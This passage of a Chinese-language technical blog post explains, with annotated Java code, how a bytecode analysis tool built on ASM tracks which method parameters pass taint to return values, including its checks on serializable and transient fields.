ClassResourceEnumerator.ClassResource&gt; classResourceByName,</span><br><span class="line">                                                                                      Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span><br><span class="line">                                                                                      InheritanceMap inheritanceMap,</span><br><span class="line">                                                                                      List&lt;MethodReference.Handle&gt; sortedMethods,</span><br><span class="line">                                                                                      SerializableDecider serializableDecider) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 数据流信息：方法、传递污染的参数索引</span></span><br><span class="line">    <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有方法</span></span><br><span class="line">    <span class="keyword">for</span> (MethodReference.Handle method : sortedMethods) &#123;</span><br><span class="line">        <span class="comment">// 跳过 static 静态初始化代码（静态代码块）</span></span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;&lt;clinit&gt;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取方法所属类的类资源</span></span><br><span class="line">        ClassResourceEnumerator.<span class="type">ClassResource</span> <span class="variable">classResource</span> <span class="operator">=</span> classResourceByName.get(method.getClassReference().getName());</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> classResource.getInputStream()) &#123;    <span class="comment">// 读取类文件</span></span><br><span class="line">            <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(inputStream);  <span class="comment">// 创建 ClassReader，后续调用 accept 方法解析类文件</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * classMap             类信息</span></span><br><span class="line"><span class="comment">                 * inheritanceMap       继承信息</span></span><br><span class="line"><span class="comment">                 * passthroughDataflow  数据流信息，初始为空</span></span><br><span class="line"><span class="comment">                 * serializableDecider  序列化决策者</span></span><br><span class="line"><span class="comment">                 * Opcodes.ASM6         ASM API 版本</span></span><br><span class="line"><span class="comment">                 * method               待观察的方法</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="comment">// 继承 asm 的 ClassVisitor(MethodVisitor) 实现对类文件的观察，记录类信息和方法信息</span></span><br><span class="line">                <span class="type">PassthroughDataflowClassVisitor</span> <span class="variable">cv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PassthroughDataflowClassVisitor</span>(classMap, inheritanceMap,</span><br><span class="line">                        passthroughDataflow, serializableDecider, Opcodes.ASM6, method);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 重写方法的调用顺序（没有重写的调用默认方法）：visit -&gt; visitMethod</span></span><br><span class="line">                cr.accept(cv, ClassReader.EXPAND_FRAMES);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 缓存方法的哪些参数会影响返回值</span></span><br><span class="line">                passthroughDataflow.put(method, cv.getReturnTaint());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Exception analyzing &quot;</span> + method.getClassReference().getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            LOGGER.error(<span class="string">&quot;Unable to analyze &quot;</span> + method.getClassReference().getName(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> passthroughDataflow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PassthroughDataflowClassVisitor</code> 继承了 asm 中的 ClassVisitor，重写 <code>visit</code> 记录方法所属类的名称，重写 <code>visitMethod</code> 对待观察的方法用 <code>PassthroughDataflowMethodVisitor</code> 判断返回值与参数的关系，方法 <code>getReturnTaint</code> 返回能够传递污染的参数索引集合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">PassthroughDataflowClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap;    <span class="comment">// 类信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle methodToVisit;     <span class="comment">// 待观察的方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;            <span class="comment">// 继承信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;    <span class="comment">// 数据流信息：方法-&gt;传递污染的参数索引</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;  <span class="comment">// 序列化决策者</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String name;    <span class="comment">// 类名</span></span><br><span class="line">    <span class="keyword">private</span> PassthroughDataflowMethodVisitor passthroughDataflowMethodVisitor;  <span class="comment">// 方法访问者</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PassthroughDataflowClassVisitor</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span><br><span class="line"><span class="params">                                           InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow,</span></span><br><span class="line"><span class="params">                                           SerializableDecider serializableDecider, <span class="type">int</span> api, MethodReference.Handle methodToVisit)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(api); <span class="comment">// ASM API 版本</span></span><br><span class="line">        <span class="built_in">this</span>.classMap = classMap;</span><br><span class="line">        <span class="built_in">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        <span class="built_in">this</span>.methodToVisit = methodToVisit;</span><br><span class="line">        <span class="built_in">this</span>.passthroughDataflow = passthroughDataflow;</span><br><span class="line">        <span class="built_in">this</span>.serializableDecider = serializableDecider;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature,</span></span><br><span class="line"><span class="params">                      String superName, String[] interfaces)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">        <span class="built_in">this</span>.name = name;   <span class="comment">// 记录类名</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 不是待观察方法的所属类</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.name.equals(methodToVisit.getClassReference().getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Expecting to visit &quot;</span> + methodToVisit.getClassReference().getName() + <span class="string">&quot; but instead got &quot;</span> + <span class="built_in">this</span>.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc,</span></span><br><span class="line"><span class="params">                                     String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="comment">// 不是待观察方法</span></span><br><span class="line">        <span class="keyword">if</span> (!name.equals(methodToVisit.getName()) || !desc.equals(methodToVisit.getDesc())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (passthroughDataflowMethodVisitor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Constructing passthroughDataflowMethodVisitor twice!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用父类方法，返回新的方法观察者</span></span><br><span class="line">        <span class="comment">// 如果类观察者的 cv 变量为空，则返回 null，否则返回 cv.visitMethod</span></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建方法访问者，判断方法返回值与参数的关系</span></span><br><span class="line">        <span class="comment">// 重写方法的调用顺序（没有重写的调用默认方法）：visitCode -&gt; visitInsn -&gt; visitFieldInsn -&gt; visitMethodInsn</span></span><br><span class="line">        passthroughDataflowMethodVisitor = <span class="keyword">new</span> <span class="title class_">PassthroughDataflowMethodVisitor</span>(</span><br><span class="line">                classMap, inheritanceMap, <span class="built_in">this</span>.passthroughDataflow, serializableDecider,</span><br><span class="line">                api, mv, <span class="built_in">this</span>.name, access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 简化代码分析，删除 JSR 指令并内联引用的子例程</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JSRInlinerAdapter</span>(passthroughDataflowMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回能够传递污染的参数索引集合</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;Integer&gt; <span class="title function_">getReturnTaint</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (passthroughDataflowMethodVisitor == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Never constructed the passthroughDataflowmethodVisitor!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> passthroughDataflowMethodVisitor.returnTaint;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PassthroughDataflowMethodVisitor</code> 继承 <code>TaintTrackingMethodVisitor</code> 实现，重写了其中的 4 个访问者方法：</p><ul><li>visitCode：启动对方法代码的访问，把参数全部存到本地变量表</li><li>visitInsn：访问零操作数的指令，这里只分析返回指令</li><li>visitFieldInsn：访问字段指令，字段指令是加载或存储对象字段值的指令</li><li>visitMethodInsn：访问方法指令，方法指令是调用方法的指令</li></ul><p>但是 TaintTrackingMethodVisitor 继承 asm 的 MethodVisitor 并重写了大量的方法，模拟 JVM 在处理方法调用中的本地变量表和操作数栈，因此实际调用的访问者方法来自 PassthroughDataflowMethodVisitor、TaintTrackingMethodVisitor、MethodVisitor 三个类。模拟是根据对字节码指令和 JVM 的了解手动进行实现（救命），先解析这里的 4 个重写方法。</p><p>数据流信息 <code>passthroughDataflow</code> 初始为空，集合变量 <code>returnTaint</code> 用于记录传递污染的参数索引。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">PassthroughDataflowMethodVisitor</span> <span class="keyword">extends</span> <span class="title class_">TaintTrackingMethodVisitor</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, ClassReference&gt; classMap;              <span class="comment">// 类信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;                                    <span class="comment">// 继承信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;    <span class="comment">// 数据流信息：方法-&gt;传递污染的参数索引</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;                          <span class="comment">// 序列化决策者</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> access;               <span class="comment">// 访问标志</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String desc;              <span class="comment">// 描述符</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Integer&gt; returnTaint; <span class="comment">// 能够传递污染的参数索引集合</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PassthroughDataflowMethodVisitor</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span><br><span class="line"><span class="params">                                            InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle,</span></span><br><span class="line"><span class="params">            Set&lt;Integer&gt;&gt; passthroughDataflow, SerializableDecider serializableDeciderMap, <span class="type">int</span> api, MethodVisitor mv,</span></span><br><span class="line"><span class="params">                                            String owner, <span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(inheritanceMap, passthroughDataflow, api, mv, owner, access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="built_in">this</span>.classMap = classMap;</span><br><span class="line">        <span class="built_in">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        <span class="built_in">this</span>.passthroughDataflow = passthroughDataflow;</span><br><span class="line">        <span class="built_in">this</span>.serializableDecider = serializableDeciderMap;</span><br><span class="line">        <span class="built_in">this</span>.access = access;</span><br><span class="line">        <span class="built_in">this</span>.desc = desc;</span><br><span class="line">        returnTaint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitCode</code> 方法将被访问的方法参数记录到本地变量表中，如果是非静态方法，则添加隐式参数 this。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitCode</span><span class="params">()</span> &#123;   <span class="comment">// 启动对方法代码的访问</span></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitCode 初始化本地变量表</span></span><br><span class="line">    <span class="built_in">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录参数到本地变量表 savedVariableState.localVars</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">localIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 非静态方法，第一个参数（隐式）为对象实例 this</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用 TaintTrackingMethodVisitor.setLocalTaint 添加到本地变量表</span></span><br><span class="line">        setLocalTaint(localIndex, argIndex);</span><br><span class="line">        localIndex += <span class="number">1</span>;</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历参数，根据描述符得出参数类型（占用空间大小）</span></span><br><span class="line">    <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">        <span class="comment">// 调用 TaintTrackingMethodVisitor.setLocalTaint 添加到本地变量表</span></span><br><span class="line">        setLocalTaint(localIndex, argIndex);</span><br><span class="line">        localIndex += argType.getSize();</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitInsn</code> 方法将存储在栈顶的返回值（传递污染的参数索引集合，可能为空）中的元素添加到 <code>returnTaint</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInsn</span><span class="params">(<span class="type">int</span> opcode)</span> &#123; <span class="comment">// 访问零操作数指令</span></span><br><span class="line">    <span class="comment">// 方法执行完毕后将从栈返回结果给调用者，因此栈顶即返回值</span></span><br><span class="line">    <span class="comment">// 存储可能被污染的返回值到 returnTaint</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.IRETURN:   <span class="comment">// 从当前方法返回 int</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.FRETURN:   <span class="comment">// 从当前方法返回 float</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.ARETURN:   <span class="comment">// 从当前方法返回对象引用</span></span><br><span class="line">            <span class="comment">// 调用 TaintTrackingMethodVisitor.getStackTaint 读取栈顶，大小为 1（32位）</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">0</span>));   <span class="comment">// 栈空间从内存高位到低位分配空间</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.LRETURN:   <span class="comment">// 从当前方法返回 long</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.DRETURN:   <span class="comment">// 从当前方法返回 double</span></span><br><span class="line">            <span class="comment">// 调用 TaintTrackingMethodVisitor.getStackTaint 读取栈顶，大小为 2（64位）</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.RETURN:    <span class="comment">// 从当前方法返回 void</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitInsn 进行出/入栈操作</span></span><br><span class="line">    <span class="built_in">super</span>.visitInsn(opcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitFieldInsn</code> 方法在读取或存储对象字段的值时调用，这里判断字段是否可序列化，如果可序列化则认为方法所属类的实例对象本身或被调用方法所属类的实例对象是受污染的，将其传递污染的参数索引集合存储到 <code>taint</code> 变量中。<br>因为可能读取的是方法所属类的实例对象字段，也可能是其他对象，其他对象得通过方法调用读取字段，涉及到方法调用方法，具体见 <code>visitMethodInsn</code> 方法中的分析。最后将栈顶（读取字段的返回值）设置为 <code>taint</code>，这里可能是空的 HashSet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFieldInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc)</span> &#123;    <span class="comment">// 访问字段指令，字段指令是加载或存储对象字段值的指令。</span></span><br><span class="line">    <span class="comment">// 方法执行过程中可能访问对象字段，访问前会进行入栈操作</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETSTATIC: <span class="comment">// 获取类的静态字段</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTSTATIC: <span class="comment">// 设置类的静态字段</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETFIELD:  <span class="comment">// 获取对象字段</span></span><br><span class="line">            <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> Type.getType(desc); <span class="comment">// 字段类型</span></span><br><span class="line">            <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">Boolean</span> <span class="variable">isTransient</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// 如果字段被 transient 关键字修饰，则不可序列化</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断读取的字段所属类是否可序列化，即字段是否可以序列化</span></span><br><span class="line">                <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                    isTransient = Boolean.TRUE;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 若读取的字段所属类可序列化</span></span><br><span class="line">                    <span class="type">ClassReference</span> <span class="variable">clazz</span> <span class="operator">=</span> classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner));</span><br><span class="line">                    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 遍历类的所有字段</span></span><br><span class="line">                        <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                            <span class="comment">// 是否为目标字段</span></span><br><span class="line">                            <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                <span class="comment">// 是否被 transient 关键字修饰</span></span><br><span class="line">                                isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (isTransient != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 若找不到目标字段，则向上查找（超类）</span></span><br><span class="line">                        clazz = classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(clazz.getSuperClass()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">// 能够传递污染的参数索引集合</span></span><br><span class="line">                Set&lt;Integer&gt; taint;</span><br><span class="line">                <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                    <span class="comment">// 若字段没有被 transient 修饰，则调用 TaintTrackingMethodVisitor.getStackTaint 读取栈顶</span></span><br><span class="line">                    <span class="comment">// 取出的是 this 或某实例对象，即字段所属实例</span></span><br><span class="line">                    taint = getStackTaint(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 否则为空</span></span><br><span class="line">                    taint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 调用 TaintTrackingMethodVisitor.visitFieldInsn 进行出/入栈操作</span></span><br><span class="line">                <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 调用 TaintTrackingMethodVisitor.setStackTaint 将栈顶设置为 taint</span></span><br><span class="line">                setStackTaint(<span class="number">0</span>, taint);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTFIELD:  <span class="comment">// 设置对象字段</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitFieldInsn 进行出/入栈操作</span></span><br><span class="line">    <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br></pre></td></tr></table></figure><p><code>visitMethodInsn</code> 方法在方法调用方法时调用（绕口令呢😅）</p><ul><li>首先记录被调用方法的参数类型（列表），根据是否为静态方法添加第一个隐式参数（被调用方法所属类的实例对象）</li><li>然后记录被调用方法的返回值类型长度（0~2），用于最后存储索引集合</li><li>模拟被调用方法的操作数栈，如果是构造方法则认为隐式参数能够传递污染，如果被调用方法在已经分析的数据流信息中则直接取出相应的参数索引集合，保存到 <code>resultTaint</code> 变量中</li><li>调用父类方法 <code>TaintTrackingMethodVisitor.visitMethodInsn</code> 执行真正的出&#x2F;入栈模拟，然后将参数索引集合存储到栈顶</li><li>最后根据被调用方法的返回值类型长度将 <code>resultTaint</code> 也合并到栈顶</li></ul><p>调用方法时会创建新的栈帧存储用到的相关数据，因此当调用到 <code>visitMethodInsn</code> 时会创建新的栈帧，其操作数栈中是被调用方法的参数（而不是当前方法）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 